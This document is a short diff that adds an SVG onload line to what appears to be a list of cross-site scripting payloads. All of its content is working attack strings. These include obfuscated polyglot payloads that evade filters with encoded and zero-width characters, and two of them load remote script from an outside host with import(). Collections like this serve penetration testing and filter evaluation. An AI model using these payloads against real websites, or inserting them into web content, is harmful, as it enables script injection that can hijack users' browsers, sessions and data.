@@ -1,3 +1,4 @@
+<svg onload=evt.composedPath().pop().defaultView.alert(1)>
 <sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--</Title/<​/Style/<​/Script/</textArea/</iFrame>\74k<K/contentEditable/autoFocus/OnFocus​=/*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76-->
 1'"<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
